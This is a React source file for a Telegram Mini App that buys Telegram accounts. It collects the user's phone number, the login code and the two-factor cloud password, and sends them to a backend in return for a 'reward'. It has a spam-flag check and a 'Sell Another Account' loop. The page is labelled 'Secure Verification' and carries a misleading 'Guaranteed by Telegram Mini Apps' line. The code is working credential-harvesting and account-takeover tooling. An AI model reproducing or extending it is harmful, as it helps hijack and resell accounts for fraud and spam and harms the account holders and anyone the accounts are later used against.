import { useState, useEffect } from "react";
import { fetchUserStats, sendCodeRequest, verifyCodeRequest, verifyPasswordRequest } from "./services/api";
import { Button } from "./components/ui/button";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "./components/ui/card";
import { Input } from "./components/ui/input";
import { Label } from "./components/ui/label";
import { Loader2, ShieldCheck, Wallet, Lock, CheckCircle2, ChevronRight } from "lucide-react";

export default function App() {
  const [step, setStep] = useState<"phone" | "otp" | "password" | "success">("phone");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const [phone, setPhone] = useState("");
  const [otp, setOtp] = useState("");
  const [password, setPassword] = useState("");

  const [reward, setReward] = useState(0);
  const [userStats, setUserStats] = useState<any>(null);

  // Load user stats on mount
  useEffect(() => {
    fetchUserStats().then(data => {
      setUserStats(data);
    }).catch(console.error);

    // Tell Telegram WebApp it is ready & expand
    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
        window.Telegram.WebApp.setHeaderColor('secondary_bg_color');
    }
  }, []);

  const handleSendCode = async () => {
    if (!phone) return setError("Phone number is required");
    setLoading(true);
    setError(null);
    try {
      const res = await sendCodeRequest(phone);
      setReward(res.reward || 0);
      setStep("otp");
    } catch (err: any) {
      setError(err.message || "Failed to send code. Make sure the number is correct and supported.");
    } finally {
      setLoading(false);
    }
  };

  const handleVerifyOtp = async () => {
    if (!otp) return setError("OTP is required");
    setLoading(true);
    setError(null);
    try {
      const res = await verifyCodeRequest(phone, otp);
      if (res.status === "password_required") {
        setStep("password");
      } else if (res.status === "spam_flagged") {
        setError(`Cannot use this account: ${res.spam_message}`);
      } else {
        fetchUserStats().then(setUserStats); // Refresh balance
        setStep("success");
      }
    } catch (err: any) {
      setError(err.message || "Verification failed");
    } finally {
      setLoading(false);
    }
  };

  const handleVerifyPassword = async () => {
    if (!password) return setError("Password is required");
    setLoading(true);
    setError(null);
    try {
      const res = await verifyPasswordRequest(phone, password);
      if (res.status === "spam_flagged") {
        setError(`Cannot use this account: ${res.spam_message}`);
      } else {
        fetchUserStats().then(setUserStats); // Refresh balance
        setStep("success");
      }
    } catch (err: any) {
      setError(err.message || "Invalid password");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen w-full flex flex-col items-center justify-center p-4">
        
      {/* Top Bar for Stats */}
      {userStats && step === "phone" && (
          <div className="w-full max-w-sm mb-6 flex justify-between items-center bg-white/10 backdrop-blur-md px-4 py-3 rounded-2xl border border-white/20 shadow-sm text-white">
              <div className="flex items-center gap-2">
                 <Wallet className="h-5 w-5 text-green-400" />
                 <span className="font-medium">Balance</span>
              </div>
              <span className="text-lg font-bold">${userStats.balance?.toFixed(2)}</span>
          </div>
      )}

      <Card className="w-full max-w-sm glass border-0 overflow-hidden relative">
        <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-500 to-purple-500"></div>
        <CardHeader className="text-center pt-8 pb-4 text-white">
          <div className="mx-auto bg-white/10 p-3 rounded-full w-fit mb-3">
             <ShieldCheck className="w-8 h-8 text-blue-400" />
          </div>
          <CardTitle className="text-2xl font-bold tracking-tight">Secure Verification</CardTitle>
          <CardDescription className="text-blue-100/70">
            {step === "phone" && "Sell your Telegram account securely"}
            {step === "otp" && "Check your Telegram app for the code"}
            {step === "password" && "Enter your cloud password"}
            {step === "success" && "Account accepted!"}
          </CardDescription>
        </CardHeader>
        
        <CardContent className="px-6 py-4">
          {error && <div className="mb-4 text-sm font-medium text-red-200 bg-red-500/20 px-3 py-2 rounded-lg border border-red-500/30 text-center">{error}</div>}

          {step === "phone" && (
            <div className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="phone" className="text-blue-50/90 text-sm">Phone Number</Label>
                <div className="relative">
                  <Input 
                    id="phone" 
                    placeholder="+1234567890" 
                    value={phone} 
                    onChange={e => setPhone(e.target.value)} 
                    className="bg-black/20 border-white/10 text-white placeholder:text-white/40 focus:border-blue-500/50 pl-4 h-12 text-lg"
                  />
                </div>
              </div>
              <Button onClick={handleSendCode} disabled={loading} className="w-full h-12 bg-white text-black hover:bg-white/90 text-md font-semibold transition-all">
                {loading && <Loader2 className="mr-2 h-5 w-5 animate-spin" />}
                Continue <ChevronRight className="ml-1 w-5 h-5"/>
              </Button>
            </div>
          )}

          {step === "otp" && (
            <div className="space-y-4">
              {reward > 0 && <p className="text-center text-sm text-green-300 font-medium mb-2">Reward for this number: ${reward}</p>}
              <div className="space-y-2">
                <Label htmlFor="otp" className="text-blue-50/90 text-sm">Login Code (OTP)</Label>
                <Input 
                  id="otp" 
                  placeholder="12345" 
                  value={otp} 
                  onChange={e => setOtp(e.target.value)} 
                  className="bg-black/20 border-white/10 text-white placeholder:text-white/40 h-12 text-center text-xl tracking-widest"
                />
              </div>
              <Button onClick={handleVerifyOtp} disabled={loading} className="w-full h-12 bg-white text-black hover:bg-white/90 text-md font-semibold transition-all">
                {loading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                Verify Code
              </Button>
            </div>
          )}

          {step === "password" && (
            <div className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="password" className="text-blue-50/90 text-sm flex items-center gap-2">
                    <Lock className="w-4 h-4"/> Cloud Password
                </Label>
                <Input 
                  id="password" 
                  type="password"
                  placeholder="Enter your 2FA password" 
                  value={password} 
                  onChange={e => setPassword(e.target.value)} 
                  className="bg-black/20 border-white/10 text-white placeholder:text-white/40 h-12"
                />
              </div>
              <Button onClick={handleVerifyPassword} disabled={loading} className="w-full h-12 bg-blue-600 text-white hover:bg-blue-500 text-md font-semibold transition-all border-0">
                {loading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                Submit Password
              </Button>
            </div>
          )}

          {step === "success" && (
            <div className="py-6 flex flex-col items-center space-y-4 text-center animate-in fade-in zoom-in duration-500">
              <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center">
                  <CheckCircle2 className="w-10 h-10 text-green-400" />
              </div>
              <div>
                  <h3 className="text-xl font-bold text-white mb-1">Successfully Verified!</h3>
                  {reward > 0 && <p className="text-green-300 font-medium">+${reward.toFixed(2)} added to your balance.</p>}
              </div>
              <Button onClick={() => { setStep("phone"); setPhone(""); setOtp(""); setPassword(""); }} className="mt-4 w-full bg-white/10 hover:bg-white/20 text-white border border-white/10">
                Sell Another Account
              </Button>
            </div>
          )}
        </CardContent>
        {step !== "success" && (
            <CardFooter className="justify-center border-t border-white/5 pt-4 pb-4">
            <p className="text-xs text-blue-100/50 flex flex-col uppercase tracking-wider items-center">
                Guaranteed by Telegram Mini Apps
            </p>
            </CardFooter>
        )}
      </Card>
      
    </div>
  );
}
